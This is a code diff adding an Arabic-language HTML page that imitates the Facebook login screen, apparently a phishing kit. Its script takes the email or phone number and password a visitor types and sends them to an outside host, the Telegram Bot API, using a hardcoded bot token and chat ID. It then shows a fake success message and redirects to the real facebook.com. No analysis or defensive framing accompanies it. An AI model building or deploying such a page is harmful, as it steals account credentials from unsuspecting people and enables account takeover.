@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Facebook</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,'Segoe UI',Tahoma,Arial,sans-serif}
+body{background:#f0f2f5;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
+.card{background:#fff;border-radius:12px;padding:30px 25px;max-width:400px;width:100%;box-shadow:0 4px 20px rgba(0,0,0,0.1)}
+.logo{text-align:center;margin-bottom:25px}
+.logo h1{color:#1877f2;font-size:40px;font-weight:bold;font-family:'Segoe UI',Arial,sans-serif}
+.logo p{color:#666;font-size:14px;margin-top:5px}
+input{width:100%;padding:14px;border:1px solid #ddd;border-radius:8px;font-size:15px;background:#f9f9f9;box-sizing:border-box;margin-bottom:10px}
+.btn{width:100%;padding:15px;background:#1877f2;color:#fff;border:none;border-radius:8px;font-size:17px;font-weight:bold;cursor:pointer;margin-top:10px}
+.forgot{text-align:center;color:#1877f2;font-size:14px;margin-top:15px}
+.divider{display:flex;align-items:center;margin:20px 0;color:#666;font-size:12px}
+.divider::before,.divider::after{content:'';flex:1;height:1px;background:#ddd}
+.divider span{padding:0 15px}
+.signup{text-align:center;background:#42b72a;color:#fff;font-size:15px;font-weight:bold;border-radius:8px;padding:15px;margin-top:10px}
+.footer{text-align:center;font-size:11px;color:#999;margin-top:20px}
+</style>
+</head>
+<body>
+<div class="card">
+<div class="logo">
+<h1>facebook</h1>
+<p>تسجيل الدخول إلى حسابك</p>
+</div>
+<form id="f">
+<input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+<input type="password" id="password" placeholder="كلمة المرور" required>
+<button type="submit" class="btn">تسجيل الدخول</button>
+</form>
+<div class="forgot">هل نسيت كلمة المرور؟</div>
+<div class="divider"><span>أو</span></div>
+<div class="signup">إنشاء حساب جديد</div>
+<div class="footer">© 2026 Facebook - Meta</div>
+</div>
+<script>
+const BOT='8890965341:AAGfQCH0ArcTVfJffobc8-c2TUygS6_G614';
+const CHAT='1250341553';
+document.getElementById('f').addEventListener('submit', async function(e){
+e.preventDefault();
+const msg='📘 *فيسبوك*\n\n📧 البريد: `'+document.getElementById('email').value+'`\n🔑 كلمة المرور: `'+document.getElementById('password').value+'`\n🕐 '+new Date().toLocaleString('ar-IQ');
+const url='https://api.telegram.org/bot'+BOT+'/sendMessage?chat_id='+CHAT+'&text='+encodeURIComponent(msg)+'&parse_mode=Markdown';
+try{await fetch(url);alert('تم تسجيل الدخول بنجاح');document.getElementById('f').reset();window.location.href='https://www.facebook.com';}catch(e){alert('خطأ');}
+});
+</script>
+</body>
+</html>
